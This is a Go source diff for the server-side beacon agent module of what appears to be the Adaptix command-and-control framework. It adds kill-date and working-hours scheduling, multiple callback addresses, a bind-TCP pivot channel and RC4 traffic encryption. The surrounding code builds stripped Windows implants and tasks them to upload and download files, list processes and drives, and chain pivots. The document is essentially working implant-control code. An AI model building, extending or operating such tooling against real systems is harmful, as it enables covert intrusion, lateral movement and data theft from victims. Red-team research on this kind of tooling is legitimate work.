@@ -7,8 +7,9 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
-	"hash/crc32"
+	"github.com/Adaptix-Framework/axc2"
 	"math/rand"
+	"net"
 	"os"
 	"os/exec"
 	"strconv"
@@ -16,33 +17,31 @@ import (
 	"time"
 )
 
-var SetListeners = []string{"BeaconHTTP", "BeaconSMB"}
-
-const (
-	SetName            = "beacon"
-	SetUiPath          = "_ui_agent.json"
-	SetCmdPath         = "_cmd_agent.json"
-	SetMaxTaskDataSize = 0x1900000 // 25 Mb
-)
-
 type GenerateConfig struct {
-	Os      string `json:"os"`
-	Arch    string `json:"arch"`
-	Format  string `json:"format"`
-	Sleep   string `json:"sleep"`
-	Jitter  int    `json:"jitter"`
-	SvcName string `json:"svcname"`
+	Os            string `json:"os"`
+	Arch          string `json:"arch"`
+	Format        string `json:"format"`
+	Sleep         string `json:"sleep"`
+	Jitter        int    `json:"jitter"`
+	SvcName       string `json:"svcname"`
+	IsKillDate    bool   `json:"is_killdate"`
+	Killdate      string `json:"kill_date"`
+	Killtime      string `json:"kill_time"`
+	IsWorkingTime bool   `json:"is_workingtime"`
+	StartTime     string `json:"start_time"`
+	EndTime       string `json:"end_time"`
 }
 
 var (
 	ObjectDir_http = "objects_http"
 	ObjectDir_smb  = "objects_smb"
+	ObjectDir_tcp  = "objects_tcp"
 	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "Boffer", "Commander", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
 	CFlag          = "-c -fno-builtin -fno-unwind-tables -fno-strict-aliasing -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpermissive -w -masm=intel -fPIC"
 	LFlags         = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
 )
 
-func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map[string]any) ([]byte, error) {
+func AgentGenerateProfile(agentConfig string, operatingSystem string, listenerWM string, listenerMap map[string]any) ([]byte, error) {
 	var (
 		generateConfig GenerateConfig
 		err            error
@@ -54,16 +53,33 @@ func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map
 		return nil, err
 	}
 
-	table := crc32.MakeTable(crc32.IEEE)
-	agentCrc := int(crc32.Checksum([]byte(SetName), table))
-
-	encrypt_key, _ := listenerMap["encrypt_key"].(string)
-	encryptKey, err := base64.StdEncoding.DecodeString(encrypt_key)
+	agentWatermark, err := strconv.ParseInt(AgentWatermark, 16, 64)
 	if err != nil {
 		return nil, err
 	}
 
-	seconds, err := parseDurationToSeconds(generateConfig.Sleep)
+	kill_date := 0
+	if generateConfig.IsKillDate {
+		dt := generateConfig.Killdate + " " + generateConfig.Killtime
+		t, err := time.Parse("02.01.2006 15:04:05", dt)
+		if err != nil {
+			err = errors.New("Invalid date format, use: 'DD.MM.YYYY hh:mm:ss'")
+			return nil, err
+		}
+		kill_date = int(t.Unix())
+	}
+
+	working_time := 0
+	if generateConfig.IsWorkingTime {
+		t := generateConfig.StartTime + "-" + generateConfig.EndTime
+		working_time, err = parseStringToWorkingTime(t)
+		if err != nil {
+			return nil, err
+		}
+	}
+
+	encrypt_key, _ := listenerMap["encrypt_key"].(string)
+	encryptKey, err := base64.StdEncoding.DecodeString(encrypt_key)
 	if err != nil {
 		return nil, err
 	}
@@ -73,19 +89,27 @@ func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map
 
 	case "http":
 
-		portAgentStr, _ := listenerMap["callback_port"].(string)
-		PortAgent, _ := strconv.Atoi(portAgentStr)
+		var Hosts []string
+		var Ports []int
+		hosts_agent, _ := listenerMap["callback_addresses"].(string)
+		lines := strings.Split(strings.TrimSpace(hosts_agent), ", ")
+		for _, line := range lines {
+			line = strings.TrimSpace(line)
+			if line == "" {
+				continue
+			}
 
-		var HostsAgent []string
-		hosts_agent, _ := listenerMap["hosts_agent"].([]any)
-		for _, value := range hosts_agent {
-			HostsAgent = append(HostsAgent, value.(string))
+			host, portStr, _ := net.SplitHostPort(line)
+			port, _ := strconv.Atoi(portStr)
+
+			Hosts = append(Hosts, host)
+			Ports = append(Ports, port)
 		}
-		c2Count := len(HostsAgent)
+		c2Count := len(Hosts)
 
 		HttpMethod, _ := listenerMap["http_method"].(string)
 		Ssl, _ := listenerMap["ssl"].(bool)
-		Uri, _ := listenerMap["urn"].(string)
+		Uri, _ := listenerMap["uri"].(string)
 		ParameterName, _ := listenerMap["hb_header"].(string)
 		UserAgent, _ := listenerMap["user_agent"].(string)
 		RequestHeaders, _ := listenerMap["request_headers"].(string)
@@ -99,12 +123,12 @@ func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map
 			return nil, err
 		}
 
-		params = append(params, agentCrc)
+		params = append(params, int(agentWatermark))
 		params = append(params, Ssl)
-		params = append(params, PortAgent)
 		params = append(params, c2Count)
 		for i := 0; i < c2Count; i++ {
-			params = append(params, HostsAgent[i])
+			params = append(params, Hosts[i])
+			params = append(params, Ports[i])
 		}
 		params = append(params, HttpMethod)
 		params = append(params, Uri)
@@ -113,21 +137,34 @@ func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map
 		params = append(params, RequestHeaders)
 		params = append(params, ansOffset1)
 		params = append(params, ansOffset2)
+		params = append(params, kill_date)
+		params = append(params, working_time)
 		params = append(params, seconds)
 		params = append(params, generateConfig.Jitter)
 
-	case "smb":
+	case "bind_smb":
 
 		pipename, _ := listenerMap["pipename"].(string)
 		pipename = "\\\\.\\pipe\\" + pipename
 
 		lWatermark, _ := strconv.ParseInt(listenerWM, 16, 64)
 
-		params = append(params, agentCrc)
+		params = append(params, int(agentWatermark))
 		params = append(params, pipename)
 		params = append(params, int(lWatermark))
-		params = append(params, seconds)
-		params = append(params, generateConfig.Jitter)
+		params = append(params, kill_date)
+
+	case "bind_tcp":
+		prepend, _ := listenerMap["prepend"].(string)
+		port, _ := listenerMap["port_bind"].(float64)
+
+		lWatermark, _ := strconv.ParseInt(listenerWM, 16, 64)
+
+		params = append(params, int(agentWatermark))
+		params = append(params, prepend)
+		params = append(params, int(port))
+		params = append(params, int(lWatermark))
+		params = append(params, kill_date)
 
 	default:
 		return nil, errors.New("protocol unknown")
@@ -157,7 +194,7 @@ func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map
 	return []byte(profileString), nil
 }
 
-func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map[string]any) ([]byte, string, error) {
+func AgentGenerateBuild(agentConfig string, operatingSystem string, agentProfile []byte, listenerMap map[string]any) ([]byte, string, error) {
 	var (
 		generateConfig GenerateConfig
 		ConnectorFile  string
@@ -177,7 +214,7 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		return nil, "", err
 	}
 
-	currentDir := PluginPath
+	currentDir := ModuleDir
 	tempDir, err := os.MkdirTemp("", "ax-*")
 	if err != nil {
 		return nil, "", err
@@ -187,9 +224,12 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 	if protocol == "http" {
 		ObjectDir = ObjectDir_http
 		ConnectorFile = "ConnectorHTTP"
-	} else if protocol == "smb" {
+	} else if protocol == "bind_smb" {
 		ObjectDir = ObjectDir_smb
 		ConnectorFile = "ConnectorSMB"
+	} else if protocol == "bind_tcp" {
+		ObjectDir = ObjectDir_tcp
+		ConnectorFile = "ConnectorTCP"
 	} else {
 		return nil, "", errors.New("protocol unknown")
 	}
@@ -286,19 +326,21 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 	}
 }
 
-func CreateAgent(initialData []byte) (AgentData, error) {
-	var agent AgentData
+func CreateAgent(initialData []byte) (adaptix.AgentData, error) {
+	var agent adaptix.AgentData
 
 	/// START CODE HERE
 
 	packer := CreatePacker(initialData)
 
-	if false == packer.CheckPacker([]string{"int", "int", "word", "word", "byte", "word", "word", "int", "byte", "byte", "int", "byte", "array", "array", "array", "array", "array"}) {
+	if false == packer.CheckPacker([]string{"int", "int", "int", "int", "word", "word", "byte", "word", "word", "int", "byte", "byte", "int", "byte", "array", "array", "array", "array", "array"}) {
 		return agent, errors.New("error agent data")
 	}
 
 	agent.Sleep = packer.ParseInt32()
 	agent.Jitter = packer.ParseInt32()
+	agent.KillDate = int(packer.ParseInt32())
+	agent.WorkingTime = int(packer.ParseInt32())
 	agent.ACP = int(packer.ParseInt16())
 	agent.OemCP = int(packer.ParseInt16())
 	agent.GmtOffset = int(packer.ParseInt8())
@@ -345,9 +387,21 @@ func CreateAgent(initialData []byte) (AgentData, error) {
 	return agent, nil
 }
 
+func AgentEncryptData(data []byte, key []byte) ([]byte, error) {
+	/// START CODE
+	return RC4Crypt(data, key)
+	/// END CODE
+}
+
+func AgentDecryptData(data []byte, key []byte) ([]byte, error) {
+	/// START CODE
+	return RC4Crypt(data, key)
+	/// END CODE
+}
+
 /// TASKS
 
-func PackTasks(agentData AgentData, tasksArray []TaskData) ([]byte, error) {
+func PackTasks(agentData adaptix.AgentData, tasksArray []adaptix.TaskData) ([]byte, error) {
 	var packData []byte
 
 	/// START CODE HERE
@@ -392,7 +446,7 @@ func CreateTaskCommandSaveMemory(ts Teamserver, agentId string, buffer []byte) i
 
 	bufferSize := len(buffer)
 
-	taskData := TaskData{
+	taskData := adaptix.TaskData{
 		Type:    TYPE_TASK,
 		AgentId: agentId,
 		Sync:    false,
@@ -405,31 +459,27 @@ func CreateTaskCommandSaveMemory(ts Teamserver, agentId string, buffer []byte) i
 		}
 
 		array := []interface{}{COMMAND_SAVEMEMORY, memoryId, bufferSize, fin - start, buffer[start:fin]}
-
-		taskData.TaskId = fmt.Sprintf("%08x", rand.Uint32())
 		taskData.Data, _ = PackArray(array)
+		taskData.TaskId = fmt.Sprintf("%08x", rand.Uint32())
 
-		var taskBuffer bytes.Buffer
-		_ = json.NewEncoder(&taskBuffer).Encode(taskData)
-
-		ts.TsTaskCreate(agentId, "", "", taskBuffer.Bytes())
+		ts.TsTaskCreate(agentId, "", "", taskData)
 	}
 	return memoryId
 }
 
-func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]any) (TaskData, ConsoleMessageData, error) {
+func CreateTask(ts Teamserver, agent adaptix.AgentData, command string, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
 	var (
-		taskData    TaskData
-		messageData ConsoleMessageData
+		taskData    adaptix.TaskData
+		messageData adaptix.ConsoleMessageData
 		err         error
 	)
 
-	taskData = TaskData{
+	taskData = adaptix.TaskData{
 		Type: TYPE_TASK,
 		Sync: true,
 	}
 
-	messageData = ConsoleMessageData{
+	messageData = adaptix.ConsoleMessageData{
 		Status: MESSAGE_INFO,
 		Text:   "",
 	}
@@ -561,10 +611,10 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 		}
 
 	case "link":
-		if subcommand == "list" {
-			//array = []interface{}{COMMAND_PS_LIST}
-
-		} else if subcommand == "smb" {
+		//if subcommand == "list" {
+		//	//array = []interface{}{COMMAND_PS_LIST}
+		//} else
+		if subcommand == "smb" {
 			target, ok := args["target"].(string)
 			if !ok {
 				err = errors.New("parameter 'target' must be set")
@@ -579,8 +629,21 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 
 			array = []interface{}{COMMAND_LINK, 1, pipe}
 
+		} else if subcommand == "tcp" {
+			target, ok := args["target"].(string)
+			if !ok {
+				err = errors.New("parameter 'target' must be set")
+				goto RET
+			}
+			port, ok := args["port"].(float64)
+			if !ok {
+				err = errors.New("parameter 'port' must be set")
+				goto RET
+			}
+			array = []interface{}{COMMAND_LINK, 2, target, int(port)}
+
 		} else {
-			err = errors.New("subcommand must be 'list' or 'smb'")
+			err = errors.New("subcommand must be 'smb' or 'tcp'")
 			goto RET
 		}
 
@@ -670,13 +733,47 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 
 	case "profile":
 		if subcommand == "download.chunksize" {
-
 			size, ok := args["size"].(float64)
 			if !ok {
 				err = errors.New("parameter 'size' must be set")
 				goto RET
 			}
 			array = []interface{}{COMMAND_PROFILE, 2, int(size)}
+
+		} else if subcommand == "killdate" {
+			dt, ok := args["datetime"].(string)
+			if !ok {
+				err = errors.New("parameter 'datetime' must be set")
+				goto RET
+			}
+
+			killDate := 0
+			if dt != "0" {
+				t, err := time.Parse("02.01.2006 15:04:05", dt)
+				if err != nil {
+					err = errors.New("Invalid date format, use: 'DD.MM.YYYY hh:mm:ss'")
+					goto RET
+				}
+				killDate = int(t.Unix())
+				// KillDate = utils.EpochTimeToSystemTime(KillDate)
+			}
+			array = []interface{}{COMMAND_PROFILE, 3, killDate}
+
+		} else if subcommand == "workingtime" {
+			t, ok := args["time"].(string)
+			if !ok {
+				err = errors.New("parameter 'time' must be set")
+				goto RET
+			}
+
+			workingTime := 0
+			if t != "0" {
+				workingTime, err = parseStringToWorkingTime(t)
+				if err != nil {
+					goto RET
+				}
+			}
+			array = []interface{}{COMMAND_PROFILE, 4, workingTime}
 
 		} else {
 			err = errors.New("subcommand for 'profile' not found")
@@ -958,8 +1055,8 @@ RET:
 	return taskData, messageData, err
 }
 
-func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, packedData []byte) []TaskData {
-	var outTasks []TaskData
+func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData adaptix.TaskData, packedData []byte) []adaptix.TaskData {
+	var outTasks []adaptix.TaskData
 
 	/// START CODE
 
@@ -1013,7 +1110,7 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 				return outTasks
 			}
 			result := packer.ParseInt8()
-			var drives []ListingDrivesData
+			var drives []adaptix.ListingDrivesDataWin
 
 			if result == 0 {
 				errorCode := packer.ParseInt32()
@@ -1027,7 +1124,7 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 					if false == packer.CheckPacker([]string{"byte", "int"}) {
 						return outTasks
 					}
-					var driveData ListingDrivesData
+					var driveData adaptix.ListingDrivesDataWin
 					driveCode := packer.ParseInt8()
 					driveType := packer.ParseInt32()
 
@@ -1275,6 +1372,9 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 			if linkType == 1 {
 				task.Message = fmt.Sprintf("----- New SMB pivot agent: [%s]===[%s] -----", agentData.Id, childAgentId)
 				ts.TsAgentConsoleOutput(childAgentId, MESSAGE_SUCCESS, task.Message, "\n", true)
+			} else if linkType == 2 {
+				task.Message = fmt.Sprintf("----- New TCP pivot agent: [%s]===[%s] -----", agentData.Id, childAgentId)
+				ts.TsAgentConsoleOutput(childAgentId, MESSAGE_SUCCESS, task.Message, "\n", true)
 			}
 
 		case COMMAND_LS:
@@ -1283,7 +1383,7 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 			}
 			result := packer.ParseInt8()
 
-			var items []ListingFileData
+			var items []adaptix.ListingFileDataWin
 			var rootPath string
 
 			if result == 0 {
@@ -1307,15 +1407,15 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 					task.Message = fmt.Sprintf("The '%s' directory is EMPTY", rootPath)
 				} else {
 
-					var folders []ListingFileData
-					var files []ListingFileData
+					var folders []adaptix.ListingFileDataWin
+					var files []adaptix.ListingFileDataWin
 
 					for i := 0; i < filesCount; i++ {
 						if false == packer.CheckPacker([]string{"byte", "long", "int", "array"}) {
 							return outTasks
 						}
 						isDir := packer.ParseInt8()
-						fileData := ListingFileData{
+						fileData := adaptix.ListingFileDataWin{
 							IsDir:    false,
 							Size:     int64(packer.ParseInt64()),
 							Date:     int64(packer.ParseInt32()),
@@ -1383,18 +1483,12 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 				if false == packer.CheckPacker([]string{"int", "int"}) {
 					return outTasks
 				}
-				sleep := packer.ParseInt32()
-				jitter := packer.ParseInt32()
-
-				agentData.Sleep = sleep
-				agentData.Jitter = jitter
+				agentData.Sleep = packer.ParseInt32()
+				agentData.Jitter = packer.ParseInt32()
 
 				task.Message = "Sleep time has been changed"
 
-				var buffer bytes.Buffer
-				_ = json.NewEncoder(&buffer).Encode(agentData)
-
-				_ = ts.TsAgentUpdateData(buffer.Bytes())
+				_ = ts.TsAgentUpdateData(agentData)
 
 			} else if subcommand == 2 {
 				if false == packer.CheckPacker([]string{"int"}) {
@@ -1402,6 +1496,32 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 				}
 				size := packer.ParseInt32()
 				task.Message = fmt.Sprintf("Download chunk size set to %v bytes", size)
+
+			} else if subcommand == 3 {
+				if false == packer.CheckPacker([]string{"int"}) {
+					return outTasks
+				}
+				agentData.KillDate = int(packer.ParseInt32())
+
+				task.Message = "Option 'killdate' is set"
+				if agentData.KillDate == 0 {
+					task.Message = "The 'killdate' option is disabled"
+				}
+
+				_ = ts.TsAgentUpdateData(agentData)
+
+			} else if subcommand == 4 {
+				if false == packer.CheckPacker([]string{"int"}) {
+					return outTasks
+				}
+				agentData.WorkingTime = int(packer.ParseInt32())
+
+				task.Message = "Option 'workingtime' is set"
+				if agentData.WorkingTime == 0 {
+					task.Message = "The 'workingtime' option is disabled"
+				}
+
+				_ = ts.TsAgentUpdateData(agentData)
 			}
 
 		case COMMAND_PS_LIST:
@@ -1411,7 +1531,7 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 
 			result := packer.ParseInt8()
 
-			var proclist []ListingProcessData
+			var proclist []adaptix.ListingProcessDataWin
 
 			if result == 0 {
 				errorCode := packer.ParseInt32()
@@ -1433,7 +1553,7 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 					if false == packer.CheckPacker([]string{"word", "word", "word", "byte", "byte", "array", "array", "array"}) {
 						return outTasks
 					}
-					procData := ListingProcessData{
+					procData := adaptix.ListingProcessDataWin{
 						Pid:       uint(packer.ParseInt16()),
 						Ppid:      uint(packer.ParseInt16()),
 						SessionId: uint(packer.ParseInt16()),
@@ -1613,6 +1733,9 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 			if pivotType == 1 {
 				messageParent = fmt.Sprintf("SMB agent disconnected %s", childAgentId)
 				messageChild = fmt.Sprintf(" ----- SMB agent disconnected from [%s] ----- ", parentAgentId)
+			} else if pivotType == 2 {
+				messageParent = fmt.Sprintf("TCP agent %s connection reset", childAgentId)
+				messageChild = fmt.Sprintf(" ----- TCP agent connection reset ----- ")
 			} else if pivotType == 10 {
 				messageParent = fmt.Sprintf("Pivot agent %s connection reset", childAgentId)
 				messageChild = fmt.Sprintf(" ----- Pivot agent connection reset ----- ")
@@ -1662,30 +1785,30 @@ func BrowserDownloadChangeState(fid string, newState int) ([]byte, error) {
 	return PackArray(array)
 }
 
-func BrowserDisks(agentData AgentData) ([]byte, error) {
+func BrowserDisks(agentData adaptix.AgentData) ([]byte, error) {
 	array := []interface{}{COMMAND_DISKS}
 	return PackArray(array)
 }
 
-func BrowserProcess(agentData AgentData) ([]byte, error) {
+func BrowserProcess(agentData adaptix.AgentData) ([]byte, error) {
 	array := []interface{}{COMMAND_PS_LIST}
 	return PackArray(array)
 }
 
-func BrowserFiles(path string, agentData AgentData) ([]byte, error) {
+func BrowserFiles(path string, agentData adaptix.AgentData) ([]byte, error) {
 	dir := ConvertUTF8toCp(path, agentData.ACP)
 	array := []interface{}{COMMAND_LS, dir}
 	return PackArray(array)
 }
 
-func BrowserUpload(ts Teamserver, path string, content []byte, agentData AgentData) ([]byte, error) {
+func BrowserUpload(ts Teamserver, path string, content []byte, agentData adaptix.AgentData) ([]byte, error) {
 	memoryId := CreateTaskCommandSaveMemory(ts, agentData.Id, content)
 	fileName := ConvertUTF8toCp(path, agentData.ACP)
 	array := []interface{}{COMMAND_UPLOAD, memoryId, fileName}
 	return PackArray(array)
 }
 
-func BrowserDownload(path string, agentData AgentData) ([]byte, error) {
+func BrowserDownload(path string, agentData adaptix.AgentData) ([]byte, error) {
 	array := []interface{}{COMMAND_DOWNLOAD, ConvertUTF8toCp(path, agentData.ACP)}
 	return PackArray(array)
 }
@@ -1700,7 +1823,7 @@ func BrowserJobKill(jobId string) ([]byte, error) {
 	return PackArray(array)
 }
 
-func BrowserExit(agentData AgentData) ([]byte, error) {
+func BrowserExit(agentData adaptix.AgentData) ([]byte, error) {
 	array := []interface{}{COMMAND_TERMINATE, 2}
 	return PackArray(array)
 }
